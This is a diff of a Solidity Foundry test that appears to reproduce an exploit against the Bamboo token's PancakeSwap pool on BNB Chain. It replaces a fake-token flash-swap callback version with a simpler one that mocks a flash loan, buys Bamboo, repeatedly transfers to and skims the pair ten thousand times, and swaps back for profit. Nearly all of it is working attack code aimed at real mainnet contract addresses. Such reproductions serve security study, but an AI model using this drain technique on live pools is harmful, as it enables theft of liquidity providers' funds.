@@ -27,9 +27,6 @@ contract BambooTest is Test {
     IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     IUniswapV2Factory factory = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
 
-    // this is a toke we will create
-    MakeMoney mm;
-    IPancakePair pairMM;
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
@@ -50,106 +47,37 @@ contract BambooTest is Test {
         return result;
     }
 
-    function testExploit() public {
-        // 1. create fake token
-        mm = new MakeMoney();
-
-        // 2. create pair and add liquidity
-        mm.approve(address(router), 10 ether);
-        router.addLiquidityETH{value: 0.001 ether}(
-            address(mm), 10 ether, 10 ether, 0.001 ether, address(this), block.timestamp
-        );
-
-        pairMM = IPancakePair(factory.getPair(address(wbnb), address(mm)));
-        vm.label(address(pairMM), "TrapPair");
-
-        // 3. get a flash loan (lets mock it out)
+    function testExploit() public {        
+        // get a flash loan (lets mock it out)
         deal(address(wbnb), address(this), 4000 ether);
 
         console.log("start balance after flashloan", toEth(wbnb.balanceOf(address(this))));
 
-        // 4. swap all wbnb for mm and trigger a callback
-        if (pairMM.token0() == address(wbnb)) {
-            IPancakePair(pairMM).swap(100_000_000_000_000, 9_000_000_000_000_000_000, address(this), "d");
-        } else {
-            IPancakePair(pairMM).swap(9_000_000_000_000_000_000, 100_000_000_000_000, address(this), "d");
-        }
-
-        pairMM.sync();
-        console.log("balance after", toEth(wbnb.balanceOf(address(this))));
-
-        console.log("profit", toEth(wbnb.balanceOf(address(this)) - 4000 ether));
-    }
-
-    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
-        uint256 bambooBalance = bamboo.balanceOf(address(wbnbBambooPair));
-
+        uint bambooBalance = bamboo.balanceOf(address(wbnbBambooPair));
+     
         address[] memory path;
         path = new address[](2);
         path[0] = address(wbnb);
         path[1] = address(bamboo);
         uint256[] memory amounts = router.getAmountsIn(bambooBalance * 9 / 10, path);
-
-        // 1 wei to bamboo ??
-        wbnb.transfer(address(bamboo), 1);
+       
         wbnb.approve(address(router), type(uint256).max);
         router.swapExactTokensForTokens(amounts[1], 0, path, address(this), block.timestamp);
 
-        uint256 max = 10_000;
-        for (uint256 i; i < max; ++i) {
-            bamboo.transfer(address(wbnbBambooPair), 1_343_870_967_101_818_317);
+        uint256 max = 10000;
+        for(uint i; i < max; ++i) {
+            bamboo.transfer(address(wbnbBambooPair), 1343870967101818317);
             wbnbBambooPair.skim(address(this));
         }
-
+        
         path[0] = address(bamboo);
         path[1] = address(wbnb);
         bamboo.approve(address(router), type(uint256).max);
 
-        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            bamboo.balanceOf(address(this)), 0, path, address(this), block.timestamp
-        );
+        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(bamboo.balanceOf(address(this))  ,0, path, address(this), block.timestamp);
 
-        mm.transfer(address(wbnbBambooPair), 10);
-
-        wbnb.transfer(address(pairMM), 0.002 ether);
-        mm.transfer(address(pairMM), 10 ether);
+        console.log("profit after return flashloan", toEth(wbnb.balanceOf(address(this)) - 4000 ether));
     }
+
 }
 
-contract MakeMoney {
-    uint256 public totalSupply;
-    mapping(address => uint256) public balanceOf;
-    mapping(address => mapping(address => uint256)) public allowance;
-    string public name = "MakeMoney";
-    string public symbol = "MM";
-    uint8 public decimals = 18;
-
-    event Transfer(address indexed from, address indexed to, uint256 amount);
-    event Approval(address indexed owner, address indexed spender, uint256 amount);
-
-    constructor() {
-        totalSupply = 1_000_000 ether;
-        balanceOf[msg.sender] = totalSupply;
-    }
-
-    function transfer(address recipient, uint256 amount) external returns (bool) {
-        balanceOf[msg.sender] -= amount;
-        balanceOf[recipient] += amount;
-        emit Transfer(msg.sender, recipient, amount);
-        return true;
-    }
-
-    function approve(address spender, uint256 amount) external returns (bool) {
-        allowance[msg.sender][spender] = amount;
-        emit Approval(msg.sender, spender, amount);
-        return true;
-    }
-
-    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
-        allowance[sender][msg.sender] -= amount;
-        balanceOf[sender] -= amount;
-        balanceOf[recipient] += amount;
-        emit Transfer(sender, recipient, amount);
-        return true;
-    }
-}
